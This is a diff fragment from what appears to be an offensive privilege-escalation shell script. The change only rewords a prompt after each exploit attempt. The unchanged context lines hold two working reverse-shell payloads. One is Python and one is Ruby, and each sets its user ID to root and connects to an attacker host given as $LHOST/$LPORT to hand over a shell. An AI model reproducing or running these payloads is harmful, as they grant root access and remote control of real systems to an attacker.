@@ -218,7 +218,7 @@ while true; do
                             
                             "$choice" -c 'import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 
-                            read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
+                            read -p "Should be done, if the exploit failed, do you want to try another one ? [y/N] : " answer
 
                             if [[ "$answer" =~ ^[Yy]$ ]]; then
                                 break
@@ -234,7 +234,7 @@ while true; do
                             
                             "$choice" -rsocket -e 'Process::Sys.setuid(0); exit if fork;c=TCPSocket.new("'$LHOST'",'$LPORT');while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
-                            read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
+                            read -p "Should be done, if the exploit failed, do you want to try another one ? [y/N] : " answer
 
                             if [[ "$answer" =~ ^[Yy]$ ]]; then
                                 break
